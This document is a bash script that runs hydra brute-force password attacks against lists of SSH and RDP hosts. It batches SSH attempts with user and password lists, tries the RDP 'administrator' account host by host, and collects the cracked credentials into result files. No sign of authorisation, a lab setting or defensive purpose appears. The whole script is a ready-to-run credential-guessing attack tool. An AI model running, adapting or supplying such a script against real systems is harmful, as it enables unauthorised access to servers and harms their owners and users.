#!/bin/bash
# Master hydra launcher - optimized for 2-CPU server
# Runs SSH and RDP in batches to avoid overload

BIGPASS=/tmp/big_combined.txt
SSH_HOSTS=/tmp/ssh_hosts.txt
RDP_HOSTS=/tmp/rdp_hosts.txt
SSH_USERS=/tmp/ssh_users.txt
SSH_OUT=/tmp/hydra_ssh_big.txt
RDP_OUT=/tmp/hydra_rdp_big.txt

# Save previous RDP precise hits
grep -v '^#' /tmp/hydra_rdp_precise.txt 2>/dev/null | grep -v '^$' > $RDP_OUT

echo "=== STARTING BATCH HYDRA ==="
echo "Time: $(date)"
echo "SSH targets: $(wc -l < $SSH_HOSTS)"
echo "RDP targets: $(wc -l < $RDP_HOSTS)"
echo "Passwords: $(wc -l < $BIGPASS)"
echo ""

# === SSH: 3 hosts at a time with -t 3 ===
echo "[*] SSH brute force (batch of 3 hosts, -t 3)..."
SSH_COUNT=0
for ip in $(cat $SSH_HOSTS); do
    echo "  Launching SSH on $ip..."
    nohup hydra -L $SSH_USERS -P $BIGPASS -t 3 -o /tmp/hydra_ssh_${ip}.txt -f $ip ssh \
        >> /tmp/hydra_ssh_${ip}.log 2>&1 &
    SSH_COUNT=$((SSH_COUNT + 1))
    
    # After every 3 hosts, wait for them to finish before starting next batch
    if [ $((SSH_COUNT % 3)) -eq 0 ]; then
        echo "  Batch of 3 started, waiting..."
        wait
        echo "  Batch done at $(date)"
        # Merge results
        for f in /tmp/hydra_ssh_*.txt; do
            grep 'host:' "$f" 2>/dev/null >> $SSH_OUT
        done
    fi
done
# Wait for remaining
wait
echo "[*] SSH complete at $(date)"
# Final merge
for f in /tmp/hydra_ssh_*.txt; do
    grep 'host:' "$f" 2>/dev/null >> $SSH_OUT
done
echo "SSH hits: $(grep -c 'host:' $SSH_OUT 2>/dev/null || echo 0)"

# === RDP: sequential, -t 1 ===
echo ""
echo "[*] RDP brute force (sequential, -t 1)..."
for ip in $(cat $RDP_HOSTS); do
    echo "  Starting RDP on $ip..."
    hydra -l administrator -P $BIGPASS -t 1 -o /tmp/hydra_rdp_${ip}.txt -f $ip rdp \
        >> /tmp/hydra_rdp_${ip}.log 2>&1
    # Merge hits
    grep 'host:' /tmp/hydra_rdp_${ip}.txt 2>/dev/null >> $RDP_OUT
    echo "  Done $ip at $(date)"
done
echo "[*] RDP complete at $(date)"
echo "RDP hits: $(grep -c 'host:' $RDP_OUT 2>/dev/null || echo 0)"

echo ""
echo "=== ALL DONE ==="
echo "=== FINAL SSH RESULTS ==="
grep 'host:' $SSH_OUT 2>/dev/null || echo "(no SSH hits)"
echo ""
echo "=== FINAL RDP RESULTS ==="
grep 'host:' $RDP_OUT 2>/dev/null || echo "(no RDP hits)"
